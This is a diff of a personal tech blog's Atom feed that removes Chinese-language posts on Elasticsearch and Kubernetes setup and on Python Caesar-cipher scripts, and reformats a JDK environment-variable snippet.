-<h3 id="第二种不用用root用户启动"><a href="#第二种不用用root用户启动" class="headerlink" title="第二种不用用root用户启动"></a>第二种不用用root用户启动</h3><p><img src="http://upload-images.jianshu.io/upload_images/3941016-9a97e1ca785470cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>解决方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">~ groupadd elsearch</div><div class="line">➜  ~ useradd elsearch -g elsearch -p elsearch</div><div class="line">➜  ~ cd /usr/share  </div><div class="line">➜   chown -R elsearch:elsearch elasticsearch </div><div class="line">➜  su elsearch</div><div class="line">./elasticsearch</div></pre></td></tr></table></figure></p>
-<h3 id="验证访问9200端口-安装成功"><a href="#验证访问9200端口-安装成功" class="headerlink" title="验证访问9200端口 安装成功"></a>验证访问9200端口 安装成功</h3><p><img src="http://upload-images.jianshu.io/upload_images/3941016-814b78ca2949d3cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h2 id="安装Kibana"><a href="#安装Kibana" class="headerlink" title="安装Kibana"></a>安装Kibana</h2><p><img src="http://upload-images.jianshu.io/upload_images/3941016-1684145ddb781d07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h2 id="安装-X-Pack"><a href="#安装-X-Pack" class="headerlink" title="安装 X-Pack"></a>安装 X-Pack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bin/elasticsearch-plugin install x-pack</div><div class="line"></div><div class="line">bin/kibana-plugin install x-pack</div></pre></td></tr></table></figure>
-<h2 id="安装-logstash"><a href="#安装-logstash" class="headerlink" title="安装 logstash"></a>安装 logstash</h2><p><img src="http://upload-images.jianshu.io/upload_images/3941016-e23da84734772460.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h2 id="安装-logstash-input-jdbc"><a href="#安装-logstash-input-jdbc" class="headerlink" title="安装 logstash-input-jdbc"></a>安装 logstash-input-jdbc</h2><p><img src="http://upload-images.jianshu.io/upload_images/3941016-23d074537c912893.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-]]></content>
-    
     <summary type="html">
     
       &lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;ul&gt;
@@ -310,7 +166,11 @@
 &lt;ul&gt;
 &lt;li&gt;配置jdk 环境变量gedit ~/.bashrc  （文件最后添加）&lt;/li&gt;
 &lt;/ul&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;export JAVA_HOME=/jdk1.8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;export JRE_HOME=$&amp;#123;JAVA_HOME&amp;#125;/jre&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;export CLASSPATH=.:$&amp;#123;JAVA_HOME&amp;#125;/lib:$&amp;#123;JRE_HOME&amp;#125;/lib&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;export PATH=$&amp;#123;JAVA_HOME&amp;#125;/bin:$PATH&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;pre&gt;&lt;code&gt;export JAVA_HOME=/jdk1.8
+export JRE_HOME=${JAVA_HOME}/jre
+export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
+export PATH=${JAVA_HOME}/bin:$PATH
+&lt;/code&gt;&lt;/pre&gt;
     
     </summary>
     
@@ -326,126 +186,11 @@
   </entry>
   
   <entry>
-    <title>凯撒密码的加密解密</title>
-    <link href="http://yoursite.com/2018/05/30/kaisa/"/>
-    <id>http://yoursite.com/2018/05/30/kaisa/</id>
-    <published>2018-05-30T07:50:31.000Z</published>
-    <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="凯撒密码的加密解密"><a href="#凯撒密码的加密解密" class="headerlink" title="凯撒密码的加密解密"></a><font color="#C71585" size="4" face="黑体">凯撒密码的加密解密</font></h1><p><img src="http://upload-images.jianshu.io/upload_images/3941016-e89a4ef8ac364e69.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="密码.jpeg"></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
-<p>凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。</p>
-</blockquote>
-<a id="more"></a>
-<h1 id="凯撒密码加密脚"><a href="#凯撒密码加密脚" class="headerlink" title="凯撒密码加密脚"></a>凯撒密码加密脚</h1><ul>
-<li>交单的26次加密脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"></div><div class="line">upperDict=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>]</div><div class="line">lowerDict=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">cesarWithLetter</span><span class="params">(ciphertext,offset)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line">    凯撒密码 :</div><div class="line">        只转换字母(包括大写小写)</div><div class="line">    参数 : </div><div class="line">        ciphertext : 明文</div><div class="line">        offset : 偏移量</div><div class="line">    '''</div><div class="line">    result = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:</div><div class="line">        <span class="keyword">if</span> ch.isupper():</div><div class="line">            result=result+upperDict[((upperDict.index(ch)+offset)%<span class="number">26</span>)]</div><div class="line">        <span class="keyword">elif</span> ch.islower():</div><div class="line">            result=result+lowerDict[((lowerDict.index(ch)+offset)%<span class="number">26</span>)]</div><div class="line">        <span class="keyword">elif</span> ch.isdigit():</div><div class="line">            result=result+ch</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            result=result+ch</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printAllResult</span><span class="params">(ciphertext)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line">    打印所有偏移结果</div><div class="line">    '''</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(upperDict)):</div><div class="line">        <span class="keyword">print</span> cesarWithLetter(ciphertext,i)</div><div class="line"></div><div class="line">ciphertext=raw_input(<span class="string">"Please input the words :"</span>)</div><div class="line">printAllResult(ciphertext)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h1 id="自动控制偏移位自动解密"><a href="#自动控制偏移位自动解密" class="headerlink" title="自动控制偏移位自动解密"></a>自动控制偏移位自动解密</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#-*-coding:utf-8-*-</span></div><div class="line">__author__ = <span class="number">007</span></div><div class="line">__date__ = <span class="number">2016</span> / <span class="number">02</span> / <span class="number">04</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#==================================================================#</span></div><div class="line"><span class="comment">#         凯撒密码(caesar)是最早的代换密码,对称密码的一种                #</span></div><div class="line"><span class="comment">#   算法：将每个字母用字母表中它之后的第k个字母（称作位移值）替代            #</span></div><div class="line"><span class="comment">#==================================================================#</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">()</span>:</span></div><div class="line">    str_raw = raw_input(<span class="string">"请输入明文："</span>)</div><div class="line">    k = input(<span class="string">"请输入位移值："</span>)</div><div class="line">    str_change = str_raw.lower()</div><div class="line">    str_list = list(str_change)</div><div class="line">    str_list_encry = str_list</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i &lt; len(str_list):</div><div class="line">        <span class="keyword">if</span> ord(str_list[i]) &lt; <span class="number">123</span>-k:</div><div class="line">            str_list_encry[i] = chr(ord(str_list[i]) + k)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            str_list_encry[i] = chr(ord(str_list[i]) + k - <span class="number">26</span>)</div><div class="line">        i = i+<span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"加密结果为："</span>+<span class="string">""</span>.join(str_list_encry)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">()</span>:</span></div><div class="line">    str_raw = raw_input(<span class="string">"请输入密文："</span>)</div><div class="line">    k = input(<span class="string">"请输入位移值："</span>)</div><div class="line">    str_change = str_raw.lower()</div><div class="line">    str_list = list(str_change)</div><div class="line">    str_list_decry = str_list</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i &lt; len(str_list):</div><div class="line">        <span class="keyword">if</span> ord(str_list[i]) &gt;= <span class="number">97</span>+k:</div><div class="line">            str_list_decry[i] = chr(ord(str_list[i]) - k)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            str_list_decry[i] = chr(ord(str_list[i]) + <span class="number">26</span> - k)</div><div class="line">        i = i+<span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"解密结果为："</span>+<span class="string">""</span>.join(str_list_decry)</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">u"1. 加密"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">u"2. 解密"</span></div><div class="line">    choice = raw_input(<span class="string">"请选择："</span>)</div><div class="line">    <span class="keyword">if</span> choice == <span class="string">"1"</span>:</div><div class="line">        encryption()</div><div class="line">    <span class="keyword">elif</span> choice == <span class="string">"2"</span>:</div><div class="line">        decryption()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">u"您的输入有误！"</span></div><div class="line"></div><div class="line"><span class="comment">#if __name__ == "__main__":</span></div><div class="line"><span class="comment">#    main</span></div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;凯撒密码的加密解密&quot;&gt;&lt;a href=&quot;#凯撒密码的加密解密&quot; class=&quot;headerlink&quot; title=&quot;凯撒密码的加密解密&quot;&gt;&lt;/a&gt;&lt;font color=&quot;#C71585&quot; size=&quot;4&quot; face=&quot;黑体&quot;&gt;凯撒密码的加密解密&lt;/font&gt;&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/3941016-e89a4ef8ac364e69.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;密码.jpeg&quot;&gt;&lt;/p&gt;
-&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。&lt;/p&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
-    
-      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
-    
-      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
-    
-  </entry>
-  
-  <entry>
     <title>kubernetes的部署</title>
     <link href="http://yoursite.com/2018/05/30/kubernetes%E7%9A%84%E9%83%A8%E7%BD%B2/"/>
     <id>http://yoursite.com/2018/05/30/kubernetes的部署/</id>
     <published>2018-05-30T07:50:31.000Z</published>
     <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="什么是kubernetes"><a href="#什么是kubernetes" class="headerlink" title="什么是kubernetes"></a>什么是kubernetes</h2><blockquote>
-<p>Kubernetes是Google开源的容器集群管理系统，其提供应用部署、维护、 扩展机制等功能，利用Kubernetes能方便地管理跨机器运行容器化的应用</p>
-</blockquote>
-<a id="more"></a>   
-<p>##主要的功能<br>1) 使用Docker对应用程序包装(package)、实例化(instantiate)、运行(run)。</p>
-<p>2) 以集群的方式运行、管理跨机器的容器。</p>
-<p>3) 解决Docker跨机器容器之间的通讯问题。</p>
-<p>4) Kubernetes的自我修复机制使得容器集群总是运行在用户期望的状态。</p>
-<h2 id="Kubernetes主要概念"><a href="#Kubernetes主要概念" class="headerlink" title="Kubernetes主要概念"></a>Kubernetes主要概念</h2><h3 id="一-Pods"><a href="#一-Pods" class="headerlink" title="一 Pods"></a>一 Pods</h3><p>Pod是Kubernetes的基本操作单元，把相关的一个或多个容器构成一个Pod，通常Pod里的容器运行相同的应用。Pod包含的容器运行在同一个Minion(Host)上，看作一个统一管理单元，共享相同的volumes和network namespace/IP和Port空间。</p>
-<h3 id="二-Services"><a href="#二-Services" class="headerlink" title="二 Services"></a>二 Services</h3><p>Services也是Kubernetes的基本操作单元，是真实应用服务的抽象，每一个服务后面都有很多对应的容器来支持，通过Proxy的port和服务selector决定服务请求传递给后端提供服务的容器，对外表现为一个单一访问接口，外部不需要了解后端如何运行，这给扩展或维护后端带来很大的好处。</p>
-<h3 id="三-Replication-Controllers"><a href="#三-Replication-Controllers" class="headerlink" title="三 Replication Controllers"></a>三 Replication Controllers</h3><p>Replication Controller确保任何时候Kubernetes集群中有指定数量的pod副本(replicas)在运行， 如果少于指定数量的pod副本(replicas)，Replication Controller会启动新的Container，反之会杀死多余的以保证数量不变。Replication Controller使用预先定义的pod模板创建pods，一旦创建成功，pod 模板和创建的pods没有任何关联，可以修改pod 模板而不会对已创建pods有任何影响，也可以直接更新通过Replication Controller创建的pods。对于利用pod 模板创建的pods，Replication Controller根据label selector来关联，通过修改pods的label可以删除对应的pods。Replication Controller主要有如下用法：<br>1) Rescheduling<br>如上所述，Replication Controller会确保Kubernetes集群中指定的pod副本(replicas)在运行， 即使在节点出错时。<br>2) Scaling<br>通过修改Replication Controller的副本(replicas)数量来水平扩展或者缩小运行的pods。<br>3) Rolling updates<br>Replication Controller的设计原则使得可以一个一个地替换pods来rolling updates服务。<br>4) Multiple release tracks<br>如果需要在系统中运行multiple release的服务，Replication Controller使用labels来区分multiple release tracks。</p>
-<h3 id="四-Labels"><a href="#四-Labels" class="headerlink" title="四 Labels"></a>四 Labels</h3><p>Labels是用于区分Pod、Service、Replication Controller的key/value键值对，Pod、Service、 Replication Controller可以有多个label，但是每个label的key只能对应一个value。Labels是Service和Replication Controller运行的基础，为了将访问Service的请求转发给后端提供服务的多个容器，正是通过标识容器的labels来选择正确的容器。同样，Replication Controller也使用labels来管理通过pod 模板创建的一组容器，这样Replication Controller可以更加容易，方便地管理多个容器，无论有多少容器。</p>
-<h2 id="Kubernetes构件"><a href="#Kubernetes构件" class="headerlink" title="Kubernetes构件"></a>Kubernetes构件</h2><p>Kubenetes整体框架，主要包括kubecfg、Master API Server、Kubelet、Minion(Host)以及Proxy</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-76ea037267e3e5b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h3 id="一-Master"><a href="#一-Master" class="headerlink" title="一  Master"></a>一  Master</h3><p>Master定义了Kubernetes 集群Master/API Server的主要声明，包括Pod Registry、Controller Registry、Service Registry、Endpoint Registry、Minion Registry、Binding Registry、RESTStorage以及Client, 是client(Kubecfg)调用Kubernetes API，管理Kubernetes主要构件Pods、Services、Minions、容器的入口。Master由API Server、Scheduler以及Registry等组成。从下图可知Master的工作流主要分以下步骤：<br>1) Kubecfg将特定的请求，比如创建Pod，发送给Kubernetes Client。<br>2) Kubernetes Client将请求发送给API server。<br>3) API Server根据请求的类型，比如创建Pod时storage类型是pods，然后依此选择何种REST Storage API对请求作出处理。<br>4) REST Storage API对的请求作相应的处理。<br>5) 将处理的结果存入高可用键值存储系统Etcd中。<br>6) 在API Server响应Kubecfg的请求后，Scheduler会根据Kubernetes Client获取集群中运行Pod及Minion信息。<br>7) 依据从Kubernetes Client获取的信息，Scheduler将未分发的Pod分发到可用的Minion节点上。<br>下面是Master的主要构件的详细介绍：<br><img src="http://upload-images.jianshu.io/upload_images/3941016-16f56503372f2b4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>图3-2 Master主要构件及工作流</p>
-<h3 id="Minion-Registry"><a href="#Minion-Registry" class="headerlink" title="Minion Registry"></a>Minion Registry</h3><p>Minion Registry负责跟踪Kubernetes 集群中有多少Minion(Host)。Kubernetes封装Minion Registry成实现Kubernetes API Server的RESTful API接口REST，通过这些API，我们可以对Minion Registry做Create、Get、List、Delete操作，由于Minon只能被创建或删除，所以不支持Update操作，并把Minion的相关配置信息存储到etcd。除此之外，Scheduler算法根据Minion的资源容量来确定是否将新建Pod分发到该Minion节点。</p>
-<h3 id="Pod-Registry"><a href="#Pod-Registry" class="headerlink" title="Pod Registry"></a>Pod Registry</h3><p>Pod Registry负责跟踪Kubernetes集群中有多少Pod在运行，以及这些Pod跟Minion是如何的映射关系。将Pod Registry和Cloud Provider信息及其他相关信息封装成实现Kubernetes API Server的RESTful API接口REST。通过这些API，我们可以对Pod进行Create、Get、List、Update、Delete操作，并将Pod的信息存储到etcd中，而且可以通过Watch接口监视Pod的变化情况，比如一个Pod被新建、删除或者更新。</p>
-<h3 id="Service-Registry"><a href="#Service-Registry" class="headerlink" title="Service Registry"></a>Service Registry</h3><p>Service Registry负责跟踪Kubernetes集群中运行的所有服务。根据提供的Cloud Provider及Minion Registry信息把Service Registry封装成实现Kubernetes API Server需要的RESTful API接口REST。利用这些接口，我们可以对Service进行Create、Get、List、Update、Delete操作，以及监视Service变化情况的watch操作，并把Service信息存储到etcd。</p>
-<h3 id="Controller-Registry"><a href="#Controller-Registry" class="headerlink" title="Controller Registry"></a>Controller Registry</h3><p>Controller Registry负责跟踪Kubernetes集群中所有的Replication Controller，Replication Controller维护着指定数量的pod 副本(replicas)拷贝，如果其中的一个容器死掉，Replication Controller会自动启动一个新的容器，如果死掉的容器恢复，其会杀死多出的容器以保证指定的拷贝不变。通过封装Controller Registry为实现Kubernetes API Server的RESTful API接口REST， 利用这些接口，我们可以对Replication Controller进行Create、Get、List、Update、Delete操作，以及监视Replication Controller变化情况的watch操作，并把Replication Controller信息存储到etcd。</p>
-<h3 id="Endpoints-Registry"><a href="#Endpoints-Registry" class="headerlink" title="Endpoints Registry"></a>Endpoints Registry</h3><p>Endpoints Registry负责收集Service的endpoint，比如Name：”mysql”，Endpoints: [“10.10.1.1:1909”，”10.10.2.2:8834”]，同Pod Registry，Controller Registry也实现了Kubernetes API Server的RESTful API接口，可以做Create、Get、List、Update、Delete以及watch操作。</p>
-<h3 id="Binding-Registry"><a href="#Binding-Registry" class="headerlink" title="Binding Registry"></a>Binding Registry</h3><p>Binding包括一个需要绑定Pod的ID和Pod被绑定的Host，Scheduler写Binding Registry后，需绑定的Pod被绑定到一个host。Binding Registry也实现了Kubernetes API Server的RESTful API接口，但Binding Registry是一个write-only对象，所有只有Create操作可以使用， 否则会引起错误。</p>
-<h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><p>Scheduler收集和分析当前Kubernetes集群中所有Minion节点的资源(内存、CPU)负载情况，然后依此分发新建的Pod到Kubernetes集群中可用的节点。由于一旦Minion节点的资源被分配给Pod，那这些资源就不能再分配给其他Pod， 除非这些Pod被删除或者退出， 因此，Kubernetes需要分析集群中所有Minion的资源使用情况，保证分发的工作负载不会超出当前该Minion节点的可用资源范围。具体来说，Scheduler做以下工作：<br>1) 实时监测Kubernetes集群中未分发的Pod。<br>2) 实时监测Kubernetes集群中所有运行的Pod，Scheduler需要根据这些Pod的资源状况安全地将未分发的Pod分发到指定的Minion节点上。<br>3) Scheduler也监测Minion节点信息，由于会频繁查找Minion节点，Scheduler会缓存一份最新的信息在本地。<br>4) 最后，Scheduler在分发Pod到指定的Minion节点后，会把Pod相关的信息Binding写回API Server。</p>
-<h3 id="Kubelet"><a href="#Kubelet" class="headerlink" title="Kubelet"></a>Kubelet</h3><p><img src="http://upload-images.jianshu.io/upload_images/3941016-470b89f752a0b96d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>图3-3 Kubernetes详细构件<br>根据上图3-3可知Kubelet是Kubernetes集群中每个Minion和Master API Server的连接点，Kubelet运行在每个Minion上，是Master API Server和Minion之间的桥梁，接收Master API Server分配给它的commands和work，与持久性键值存储etcd、file、server和http进行交互，读取配置信息。Kubelet的主要工作是管理Pod和容器的生命周期，其包括Docker Client、Root Directory、Pod Workers、Etcd Client、Cadvisor Client以及Health Checker组件，具体工作如下：<br>1) 通过Worker给Pod异步运行特定的Action。<br>2) 设置容器的环境变量。<br>3) 给容器绑定Volume。<br>4) 给容器绑定Port。<br>5) 根据指定的Pod运行一个单一容器。<br>6) 杀死容器。<br>7) 给指定的Pod创建network 容器。<br>8) 删除Pod的所有容器。<br>9) 同步Pod的状态。<br>10) 从Cadvisor获取container info、 pod info、root info、machine info。<br>11) 检测Pod的容器健康状态信息。<br>12) 在容器中运行命令。</p>
-<h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>Proxy是为了解决外部网络能够访问跨机器集群中容器提供的应用服务而设计的，从上图3-3可知Proxy服务也运行在每个Minion上。Proxy提供TCP/UDP sockets的proxy，每创建一种Service，Proxy主要从etcd获取Services和Endpoints的配置信息，或者也可以从file获取，然后根据配置信息在Minion上启动一个Proxy的进程并监听相应的服务端口，当外部请求发生时，Proxy会根据Load Balancer将请求分发到后端正确的容器处</p>
-<h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><blockquote>
-<p>准备工作</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>对象</th>
-<th>版本</th>
-<th>ip</th>
-<th>备注 </th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>k8s-master</td>
-<td>centos7</td>
-<td>192.168.29.11</td>
-<td>K8S的master所在主机</td>
-</tr>
-<tr>
-<td>etcd-server</td>
-<td>centos7</td>
-<td>192.168.29.11</td>
-<td>etcd服务所在主机，与master在同一机器</td>
-</tr>
-<tr>
-<td>k8s-slave</td>
-<td>centos7</td>
-<td>192.168.29.12</td>
-<td>K8S节点所在主机</td>
-</tr>
-</tbody>
-</table>
-<h3 id="安装主要程序"><a href="#安装主要程序" class="headerlink" title="安装主要程序"></a>安装主要程序</h3><ul>
-<li>192.168.29.11<br>执行以下命令，安装kubernetes和etcd</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install --enablerepo=virt7-docker-common-release kubernetes etcd</div></pre></td></tr></table></figure>
-<h2 id="禁用防火墙"><a href="#禁用防火墙" class="headerlink" title="禁用防火墙"></a>禁用防火墙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl disable iptables-services firewalld</div><div class="line">systemctl stop iptables-services firewalld</div></pre></td></tr></table></figure>
-<h3 id="192-168-29-11-上主机配置"><a href="#192-168-29-11-上主机配置" class="headerlink" title="192.168.29.11 上主机配置"></a>192.168.29.11 上主机配置</h3><h4 id="一-修改文件-etc-kubernetes-config-所有节点"><a href="#一-修改文件-etc-kubernetes-config-所有节点" class="headerlink" title="一 修改文件/etc/kubernetes/config(所有节点)"></a>一 修改文件/etc/kubernetes/config(所有节点)</h4><p>注意，master和slave主机都要修改<br>指定master主机的ip，文件内容如下：</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-f2286b4085fb8079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h4 id="二-修改配置文件-etc-etcd-etcd-conf-确保etcd监听所有地址。内容如下"><a href="#二-修改配置文件-etc-etcd-etcd-conf-确保etcd监听所有地址。内容如下" class="headerlink" title="二 修改配置文件/etc/etcd/etcd.conf,确保etcd监听所有地址。内容如下"></a>二 修改配置文件/etc/etcd/etcd.conf,确保etcd监听所有地址。内容如下</h4><p><img src="http://upload-images.jianshu.io/upload_images/3941016-a881113924dd47da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h4 id="三-修改配置文件-etc-kubernetes-apiserver"><a href="#三-修改配置文件-etc-kubernetes-apiserver" class="headerlink" title="三 修改配置文件/etc/kubernetes/apiserver"></a>三 修改配置文件/etc/kubernetes/apiserver</h4><p><img src="http://upload-images.jianshu.io/upload_images/3941016-83c145be3b651c13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h4 id="四-修改配置文件-etc-kubernetes-controller-manager，定义slave主机ip地址"><a href="#四-修改配置文件-etc-kubernetes-controller-manager，定义slave主机ip地址" class="headerlink" title="四 修改配置文件/etc/kubernetes/controller-manager，定义slave主机ip地址"></a>四 修改配置文件/etc/kubernetes/controller-manager，定义slave主机ip地址</h4><p><img src="http://upload-images.jianshu.io/upload_images/3941016-6a410aa1eaf7d1b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
